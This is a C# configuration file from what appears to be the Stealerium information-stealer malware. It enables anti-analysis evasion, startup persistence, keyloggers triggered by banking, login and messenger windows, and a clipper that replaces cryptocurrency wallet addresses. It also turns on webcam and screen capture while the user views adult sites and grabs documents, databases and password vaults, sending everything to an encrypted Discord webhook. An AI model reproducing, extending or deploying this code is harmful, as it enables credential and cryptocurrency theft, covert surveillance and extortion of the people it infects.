﻿using System.Collections.Generic;
using Stealerium.Modules.Implant;

namespace Stealerium
{
    public static class Config
    {
        public static string Version = "1.0";

#if DEBUG
        // Debug mode (write all exceptions to file)
        public static string DebugMode = "1";

        // Application mutex (random)
        public static string Mutex = "ewf54swef564";

        // Anti VM, SandBox, Any.Run, Emulator, Debugger, Process
        public static string AntiAnalysis = "1";

        // Drop and Hide executable to startup directory
        public static string Autorun = "0";

        // Random start delay (0-10 seconds)
        public static string StartDelay = "0";

        // Create web-camera and desktop screenshot when user watching NSFW content
        public static string WebcamScreenshot = "1";

        // Run keylogger when user opened log-in form, banking service or messenger
        public static string KeyloggerModule = "0";

        // Run clipper when user opened cryptocurrency application
        public static string ClipperModule = "0";

        // File grabber:
        public static string GrabberModule = "0";

        // Discord Webhook where to send captured logs
        public static string Webhook =
            "ENCRYPTED:fleaTKsR0trQiaWh0H+vOvHR4WDn0LEpdxH+edudpJFgHk0gqzZqQCrz+uijeyRD9bd90K68CTHNtovE8WK18CnFZZT8xgGBmQSEPuAUSPDHQqgVOeILB5awg4etFhtwJlPmQhKwgLhRgNNKFka8/ekJmadm1C0L2jqQNBRG8Bg=";
#elif RELEASE
        // Debug mode (write all exceptions to file)
        public static string DebugMode = "--- Debug ---";

        // Application mutex (random)
        public static string Mutex = "--- Mutex ---";

        // Anti VM, SandBox, Any.Run, Emulator, Debugger, Process
        public static string AntiAnalysis = "--- AntiAnalysis ---";

        // Drop and Hide executable to startup directory
        public static string Autorun = "--- Startup ---";

        // Random start delay (0-10 seconds)
        public static string StartDelay = "--- StartDelay ---";

        // Create web-camera and desktop screenshot when user watching NSFW content
        public static string WebcamScreenshot = "--- WebcamScreenshot ---";

        // Run keylogger when user opened log-in form, banking service or messenger
        public static string KeyloggerModule = "--- Keylogger ---";

        // Run clipper when user opened cryptocurrency application
        public static string ClipperModule = "--- Clipper ---";

        // File grabber:
        public static string GrabberModule = "--- Grabber ---";

        // Discord Webhook where to send captured logs
        public static string Webhook =
            "ENCRYPTED:fleaTKsR0trQiaWh0H+vOvHR4WDn0LEpdxH+edudpJFgHk0gqzZqQCrz+uijeyRD9bd90K68CTHNtovE8WK18CnFZZT8xgGBmQSEPuAUSPDHQqgVOeILB5awg4etFhtwJlPmQhKwgLhRgNNKFka8/ekJmadm1C0L2jqQNBRG8Bg=";
#endif

        // Discord Webhook bot avatar
        public static string Avatar = StringsCrypt.Decrypt(new byte[]
        {
            227, 229, 163, 37, 29, 43, 37, 158, 104, 37, 13, 195, 211, 80, 55, 1, 163, 216, 210, 234, 239, 30, 166, 60,
            215, 48, 124, 51, 90, 119, 2, 1, 27, 146, 87, 230, 46, 22, 142, 96, 111, 178, 13, 55, 6, 237, 130, 18, 40,
            44, 161, 24, 55, 9, 193, 74, 194, 138, 204, 229, 140, 130, 57, 170, 67, 197, 229, 49, 0, 118, 183, 36, 174,
            137, 185, 145, 88, 223, 139, 205, 20, 137, 77, 237, 96, 53, 25, 41, 165, 223, 103, 179, 194, 240, 115, 161,
            8, 34, 9, 222, 255, 217, 237, 155, 33, 154, 251, 205, 13, 39, 194, 193
        });

        // Discord Webhook bot username
        public static string Username = StringsCrypt.Decrypt(new byte[]
            { 208, 138, 80, 115, 89, 12, 47, 194, 189, 116, 154, 25, 46, 155, 252, 130 });

        // Clipper addresses:
        public static Dictionary<string, string> ClipperAddresses =
            new Dictionary<string, string>
            {
                { "btc", "--- ClipperBTC ---" }, // Bitcoin
                { "eth", "--- ClipperETH ---" }, // Ethereum
                { "ltc", "--- ClipperLTC ---" } // Litecoin
            };

        // Start keylogger when active window title contains this text:
        public static string[] KeyloggerServices =
        {
            "facebook", "twitter",
            "chat", "telegram", "skype", "discord", "viber", "message",
            "gmail", "protonmail", "outlook",
            "password", "encryption", "account", "login", "key", "sign in",
            "bank", "credit", "card",
            "shop", "buy", "sell"
        };

        public static string[] BankingServices =
        {
            "qiwi", "money", "exchange",
            "bank", "credit", "card", "paypal"
        };

        // Start clipper when active window title contains this text:
        public static string[] CryptoServices =
        {
            "bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin",
            "btc", "eth", "xmr", "xlm", "xrp", "ltc", "bch",
            "blockchain", "paxful", "investopedia", "buybitcoinworldwide",
            "cryptocurrency", "crypto", "trade", "trading", "wallet", "coinomi", "coinbase"
        };

        // Start webcam capture when active window title contains this text:
        public static string[] PornServices =
        {
            "porn", "sex", "hentai", "chaturbate"
        };


        // Maximum file size
        public static int GrabberSizeLimit = 5120; // 5MB

        // Grabber file types:
        public static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>
        {
            ["Document"] = new[] { "pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt", "json" },
            ["DataBase"] = new[]
                { "db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk", "dbf", "wallet", "ini" },
            ["SourceCode"] = new[]
            {
                "c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php", "go", "js", "rb", "pl", "swift",
                "java", "kt", "kts", "ino"
            },
            ["Image"] = new[] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" }
        };

        // Decrypt config values
        public static void Init()
        {
            // Decrypt discord webhook
            Webhook = StringsCrypt.DecryptConfig(Webhook);

            if (ClipperModule != "1") return;
            ClipperAddresses["btc"] = StringsCrypt.DecryptConfig(ClipperAddresses["btc"]);
            ClipperAddresses["eth"] = StringsCrypt.DecryptConfig(ClipperAddresses["eth"]);
            ClipperAddresses["ltc"] = StringsCrypt.DecryptConfig(ClipperAddresses["ltc"]);
        }
    }
}